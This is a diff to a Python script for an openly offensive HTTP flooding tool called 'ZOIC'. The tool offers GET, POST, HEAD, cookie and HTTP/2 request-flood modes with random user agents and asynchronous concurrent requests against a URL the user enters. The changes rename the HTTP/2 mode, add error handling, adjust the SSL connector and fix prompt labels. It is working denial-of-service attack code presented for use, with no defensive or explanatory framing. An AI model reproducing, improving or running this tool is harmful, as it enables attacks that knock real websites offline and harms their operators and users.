@@ -6,6 +6,8 @@ import threading
 import random
 import time
 import requests
+from aiohttp import TCPConnector
+from aiohttp import ClientSession
 from pystyle import Colorate, Colors
 
 user_agent = [
@@ -84,9 +86,9 @@ def logo():
     post  |  POST Request Attack    
     head  |  HEAD Request Attack      
     cook  |  COOKIE Request Attack
-    http  |  HTTP/2 Request Attack
-
-          
+    http2 |  HTTP/2 Request Attack
+    
+                            
 """))
 
 def layer7():
@@ -255,6 +257,9 @@ def layer7():
                         if retries > 0:
                             await asyncio.sleep(2) 
                             await send_request(session, url, retries - 1)
+                except aiohttp.ClientError as e:
+                    print(Colorate.Horizontal(Colors.red_to_white, f"[-] {e} by ZOIC !!"))
+            
 
             async def send_requests(url, head_request):
                 async with aiohttp.ClientSession() as session:
@@ -369,7 +374,7 @@ def layer7():
 """)))
             
             get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
-═══[root@COOKIE-REQUEST(100~1000)]                                                                   
+═══[root@GET-REQUEST(100~1000)]                                                                   
 ═══> 
 """)))
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))   
@@ -379,7 +384,7 @@ def layer7():
             start_threads(url, num_threads, get_request, cookies)
 
 
-        elif select == "http" or select.lower() == "5":
+        elif select == "http2" or select.lower() == "5":
             async def send_request(session, url, retries=3):
                     headers = {
                         "User-Agent": random.choice(user_agent),
@@ -404,9 +409,8 @@ def layer7():
                             await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
-                connector = aiohttp.TCPConnector(ssl=False)  
-
-                async with aiohttp.ClientSession(connector=connector) as session: 
+                connector = TCPConnector(ssl=True, force_close=True)  
+                async with ClientSession(connector=connector) as session:
                     tasks = [send_request(session, url) for _ in range(get_request)]
                     await asyncio.gather(*tasks)
 
@@ -436,7 +440,7 @@ def layer7():
 """)))
             
             get_request = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
-═══[root@GET-REQUEST(100~1000)]                                                                   
+═══[root@HTTP2-REQUEST(100~1000)]                                                                   
 ═══> 
 """)))
             print(Colorate.Horizontal(Colors.green_to_white, "[+] Loading ZOIC..."))  
